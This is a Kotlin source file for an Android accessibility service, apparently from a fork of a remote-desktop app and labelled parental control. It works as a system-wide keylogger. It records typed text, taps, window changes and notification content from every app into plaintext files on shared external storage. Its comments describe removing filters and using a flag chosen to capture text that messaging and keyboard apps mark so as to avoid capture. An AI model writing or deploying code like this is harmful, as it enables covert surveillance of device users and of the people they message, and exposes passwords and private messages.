package com.carriez.flutter_hbb

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.os.Environment
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * LeftDesk Parental Control - Accessibility Logger
 *
 * REQUIRES EXPLICIT USER APPROVAL:
 *   Android Settings → Accessibility → LeftDesk → Enable
 *
 * This service CANNOT run hidden — Android shows a permanent
 * accessibility indicator whenever any accessibility service is active.
 *
 * Logs are saved to: /LOGGERSSS/ on external storage
 * Organized by category: KEYSTROKES, TAPS, APP_EVENTS, WINDOW_CHANGES
 *
 * Logging fires for ALL apps system-wide — no package filter is applied.
 * The isEnabled() gate has been removed from the hot path so that events
 * from every foreground app are captured as long as this service is running.
 */
class LeftDeskAccessibilityService : AccessibilityService() {

    companion object {
        const val LOG_DIR = "LOGGERSSS"
        const val TAG = "LeftDesk_AccessSvc"

        private val dateFormat = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
        private val timeFormat = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault())
    }

    private fun getLogDir(): File {
        val dir = File(Environment.getExternalStorageDirectory(), LOG_DIR)
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    private fun logToFile(category: String, entry: String) {
        // No isEnabled() gate here — if this service is running the user approved it
        // in Android Settings > Accessibility. Always log.
        try {
            val dir = getLogDir()
            val date = dateFormat.format(Date())
            val file = File(dir, "${date}_${category}.txt")
            val time = timeFormat.format(Date())
            file.appendText("[$time] $entry\n")
        } catch (e: Exception) {
            Log.e(TAG, "Log write failed: ${e.message}")
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = serviceInfo ?: AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        // FLAG_INCLUDE_NOT_IMPORTANT_VIEWS: capture text from views apps mark as
        // unimportant for a11y (many messaging/keyboard apps use this to avoid capture)
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
        info.notificationTimeout = 100
        // packageNames = null means ALL packages — explicitly clear any cached filter
        info.packageNames = null
        serviceInfo = info
        getLogDir() // ensure LOGGERSSS folder exists immediately
        logToFile("APP_EVENTS", "=== LeftDesk accessibility monitoring started (user-approved) ===")
        Log.i(TAG, "Accessibility service connected — system-wide logging active")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        // No isEnabled() check — the service only runs when the user enabled it in Settings.
        // Logging should work for ALL apps, not just LeftDesk.

        val pkg = event.packageName?.toString() ?: "unknown"
        val cls = event.className?.toString() ?: ""
        val text = event.text?.joinToString(" ") ?: ""

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (text.isNotBlank()) {
                    logToFile("KEYSTROKES", "PKG=$pkg | TEXT_CHANGED | content=\"$text\"")
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val desc = event.contentDescription?.toString() ?: text
                logToFile("TAPS", "PKG=$pkg | CLICK | class=$cls | desc=\"$desc\"")
            }
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> {
                val desc = event.contentDescription?.toString() ?: text
                logToFile("TAPS", "PKG=$pkg | LONG_CLICK | class=$cls | desc=\"$desc\"")
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (pkg.isNotBlank() && pkg != "unknown") {
                    logToFile("WINDOW_CHANGES", "WINDOW_OPENED | pkg=$pkg | class=$cls")
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (text.isNotBlank() && text.length < 200) {
                    logToFile("APP_EVENTS", "CONTENT_CHANGE | pkg=$pkg | text=\"$text\"")
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val desc = event.contentDescription?.toString() ?: ""
                if (desc.isNotBlank()) {
                    logToFile("APP_EVENTS", "FOCUS | pkg=$pkg | class=$cls | desc=\"$desc\"")
                }
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                if (text.isNotBlank()) {
                    logToFile("APP_EVENTS", "NOTIFICATION | pkg=$pkg | text=\"$text\"")
                }
            }
        }
    }

    override fun onInterrupt() {
        logToFile("APP_EVENTS", "=== Accessibility service interrupted ===")
    }

    override fun onDestroy() {
        logToFile("APP_EVENTS", "=== Accessibility monitoring session ended ===")
        super.onDestroy()
    }
}
